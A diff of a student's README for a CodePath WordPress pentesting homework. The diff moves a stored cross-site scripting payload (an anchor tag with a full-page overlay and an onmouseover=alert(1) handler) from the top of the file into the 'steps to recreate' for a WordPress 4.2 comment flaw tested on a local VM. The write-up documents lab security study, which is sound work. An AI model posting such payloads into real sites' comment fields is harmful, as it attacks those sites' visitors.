@@ -1,7 +1,3 @@
-
-
-<a href='https://www.youtube.com/watch?v=dQw4w9WgXcQ/' title="" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(1)//'>Test</a>
-
 # Project 7 - WordPress Pentesting
 
 Time spent: 4 hours spent in total
@@ -17,8 +13,9 @@ Time spent: 4 hours spent in total
     - Tested in version: 4.2
     - Fixed in version: Fixed in: 4.2.4
   - [ ] GIF Walkthrough: https://github.com/Ethan-Andrews/codepath_homework/blob/2c59a421123d16a7cfd3e00f09f997d5f6193f9a/Exploit%201.gif
-  - [ ] Steps to recreate: 
-  - [ ] Affected source code:
+  - [ ] Steps to recreate: paste the following into the comment section of wordpress. "<a href='https://www.youtube.com/watch?v=dQw4w9WgXcQ/' title="" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(1)//'>Test</a>"
+  
+  - [ ] Affected source code: http://wpdistillery.vm/#comment
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 ### 2. (Required) Vulnerability Name or ID
   - [ ] Summary: 
